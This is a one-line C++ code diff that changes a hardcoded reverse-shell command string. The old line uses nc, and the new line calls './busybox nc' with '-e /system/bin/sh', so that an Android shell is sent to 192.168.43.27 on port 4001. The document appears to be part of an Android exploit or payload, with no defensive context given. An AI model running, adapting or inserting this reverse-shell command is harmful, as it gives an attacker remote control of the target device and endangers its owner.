@@ -1,1 +1,1 @@
-std::string command = "nc -nv 192.168.43.27 4001 -e /system/bin/sh";
+std::string command = "./busybox nc 192.168.43.27 4001 -e /system/bin/sh";
